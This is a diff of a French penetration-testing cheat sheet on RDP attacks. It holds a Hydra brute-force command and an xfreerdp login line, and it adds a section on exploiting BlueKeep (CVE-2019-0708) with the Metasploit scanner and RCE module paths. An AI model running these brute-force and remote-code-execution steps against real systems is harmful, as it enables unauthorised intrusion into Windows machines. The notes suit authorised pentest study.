@@ -14,5 +14,19 @@ Metasploit renvoie la présence d'un service RDP actif et donnera la version de 
 
 ### Bruteforce avec Hydra  
 `hydra -L Users_wordlist.txt -P Passwords_wordlist.txt rdp://IP_target_address -s Port`  
-Si la machine cible utilise freexrd, voici la connexion :
-`xfreerdp /u:administrator /p:password123 /v:192.168.1.1`
+Si la machine cible utilise freexrd, voici la connexion :  
+`xfreerdp /u:administrator /p:password123 /v:192.168.1.1`  
+
+### Exploitation de la CVE-2019-0708 - BlueKeep
+BlueKeep affecte :  
+* XP  
+* Vista  
+* Windows 7  
+* Windows Server 2008 & R2  
+  
+Après avoir fait un scan et identifié le service RDP ouvert, on lance le module de scanner de Metasploit pour nous indiquer si la cible est vulnérable à cette CVE :  
+`use scanner/rdp/cve_2019_0708_bluekeep` set RHOSTS, RPORT...  
+
+Puis exploitation avec :  
+`exploit/windows/rdp/cve_2019_0708_bluekeep_rce` set RHOSTS, RPORT...  
+`show targets` permet de renseigner la version de Windows manuellement.  
